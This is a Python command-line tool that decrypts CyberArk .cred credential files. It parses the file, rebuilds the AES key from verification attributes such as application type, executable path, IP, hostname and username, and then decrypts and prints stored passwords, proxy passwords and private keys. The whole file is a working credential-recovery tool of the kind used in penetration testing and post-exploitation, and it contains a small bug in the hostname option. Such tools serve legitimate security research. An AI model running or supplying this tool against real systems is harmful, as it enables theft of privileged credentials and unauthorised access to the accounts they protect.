import os
import sys
import argparse
import hashlib
import struct
import hashlib
import base64
from Crypto import Random
from Crypto.Cipher import AES
from enum import IntFlag


class AESCipher(object):
    def __init__(self, key): 
        self.bs = AES.block_size
        self.key = key

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw.encode())

    def decrypt(self, enc):       
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]


class VerificationFlags(IntFlag):
    ApplicationType = 0x1
    ExecutablePath = 0x2
    MachineIP = 0x4
    Username = 0x8
    RandomHash = 0x10
    MachineHostname = 0x20


class CyberArkCredFile(object):
    def __init__(self, filepath):
        self.filepath = filepath
        self.data = self.parse_cred_file()

    def parse_cred_file(self):
        result = {}
        f = open(self.filepath, "r")
        for line in f:
            k, v = line.split("=")
            result[k] = v.strip()
        return result

    def get_cred_file_type(self):
        return self.data.get("CredFileType")

    def get_cred_file_version(self):
        return self.data.get("CredFileVersion")

    def get_verification_flags(self):
        flags = VerificationFlags(int(self.data.get("VerificationsFlag", VerificationFlags.RandomHash)))
        return flags

    def get_additional_information_hash(self):
        return self.data.get("AdditionalInformation")

    def get_verification_attributes_from_file(self):
        flags = self.get_verification_flags()
        table = {
            VerificationFlags.ApplicationType: "ClientApp",
            VerificationFlags.ExecutablePath: "AppPath",
            VerificationFlags.MachineIP: "ClientIP",
            VerificationFlags.Username: "OSUser",
            VerificationFlags.RandomHash: "AdditionalInformation",
            VerificationFlags.MachineHostname: "ClientHostname"
        }
        result = { }
        for verification_flag in VerificationFlags:
            if verification_flag in flags:
                lookup_name = table[verification_flag]
                lookup_value = self.data.get(lookup_name, None)
                if lookup_value:
                    result[verification_flag] = lookup_value
        return result        


class CyberArkCredFileDecrypter(object):
    def __init__(self, cred_file, verification_attributes):
        self.cred_file = cred_file
        self.verification_attributes = verification_attributes

    def get_merged_verification_attributes(self):
        verification_attributes = self.verification_attributes.copy()
        verification_attributes.update(self.cred_file.get_verification_attributes_from_file())
        return verification_attributes

    def check_required_verification_attributes_present(self):
        flags = self.cred_file.get_verification_flags()
        verification_attributes = self.get_merged_verification_attributes()
        for flag in VerificationFlags:
            if flag in flags:
                if flag not in verification_attributes:
                    return False
        return True

    def generate_key_base(self):
        verification_attributes = self.get_merged_verification_attributes()
        result = ""
        if VerificationFlags.ApplicationType in verification_attributes:
            app_type = verification_attributes[VerificationFlags.ApplicationType]
            m = hashlib.sha1()
            m.update(app_type.lower().encode())
            digest = m.digest()
            result = base64.b64encode(digest).decode()
        if VerificationFlags.ExecutablePath in verification_attributes:
            result += verification_attributes[VerificationFlags.ExecutablePath].lower()
        if VerificationFlags.MachineIP in verification_attributes:
            result += verification_attributes[VerificationFlags.MachineIP]
        if VerificationFlags.MachineHostname in verification_attributes:
            result += verification_attributes[VerificationFlags.MachineHostname].lower()
        if VerificationFlags.Username in verification_attributes:
            result += verification_attributes[VerificationFlags.Username].lower()
        if VerificationFlags.RandomHash in verification_attributes:
            result += verification_attributes[VerificationFlags.RandomHash]
        return result

    def generate_derived_aes_key(self, key_base):
        result = b""        
        key_base = key_base.encode("utf-8")
        hash_base = hashlib.sha1()
        hash_base.update(key_base)
        for i in range(2):
            deriv_hash = hash_base.copy()
            deriv_hash.update(struct.pack(">L", i))
            result += deriv_hash.digest()
        return result[:32]

    def decrypt_field(self, name):
        if name not in self.cred_file.data:
            return None
        enc_value = self.cred_file.data.get(name)
        enc_value = bytes.fromhex(enc_value)
        crypto = AESCipher(self.aes_key)
        dec_value = crypto.decrypt(enc_value)
        value = dec_value[0:-20]
        value_hash = dec_value[-20:]
        return value, value_hash

    def process_field(self, name, is_text=True):
        values = self.decrypt_field(name)
        if values is not None:
            value = values[0]
            if is_text:
                value = value.decode()           
            print("{} => '{}' ({})".format(name, value, values[1].hex()))
        else:
            print("{} => Not present".format(name))

    def process(self):
        self.key_base = self.generate_key_base()
        self.aes_key = self.generate_derived_aes_key(self.key_base)
        print("Base Key: {}\nDerived AES Key: {} ({})\n".format(self.key_base, self.aes_key, self.aes_key.hex()))
        cred_file_type = self.cred_file.get_cred_file_type()
        self.process_field("Password")
        self.process_field("NewPassword")
        self.process_field("ProxyPassword")
        self.process_field("PrivateKey", is_text=False)


def prepare_add_verification_attributes(args):
    result = {}
    if args.apptype:
        result[VerificationFlags.ApplicationType] = args.apptype
    if args.exepath:
        result[VerificationFlags.ExecutablePath] = args.exepath
    if args.machineip:
        result[VerificationFlags.MachineIP] = args.machineip
    if args.username:
        result[VerificationFlags.Username] = args.username
    if args.hostname:
        result[VerificationFlags.Hostname] = args.hostname
    return result


def main():
    help_formatter = argparse.ArgumentDefaultsHelpFormatter
    parser = argparse.ArgumentParser(formatter_class=help_formatter)
    parser.add_argument("-f", "--file", help=".cred file to decrypt", required=True)
    parser.add_argument("--apptype", help="Verification Attribute Application Type", required=False)
    parser.add_argument("--exepath", help="Verification Attribute Executable Path", required=False)
    parser.add_argument("--machineip", help="Verification Attribute Machine IP", required=False)
    parser.add_argument("--username", help="Verification Attribute Username", required=False)
    parser.add_argument("--hostname", help="Verification Attribute Hostname", required=False)
    args = parser.parse_args()
    add_verification_attr = prepare_add_verification_attributes(args)
    print("Parsing credential file...")
    cred_file = CyberArkCredFile(args.file)
    print("Credential file type: {}".format(cred_file.get_cred_file_type()))
    print("Credential file version: {}".format(cred_file.get_cred_file_version()))
    print("Credential verification flags: {}".format(str(cred_file.get_verification_flags())))
    print("Credential verification attributes: {}".format(cred_file.get_verification_attributes_from_file()))
    decrypter = CyberArkCredFileDecrypter(cred_file, add_verification_attr)
    required_verification_attr_present = decrypter.check_required_verification_attributes_present()
    if(not required_verification_attr_present):
        print("Not all required verification attributes present. Not enough information to generate AES decryption key!")
        exit(1)
    decrypter.process()


if __name__ == '__main__':
    main()
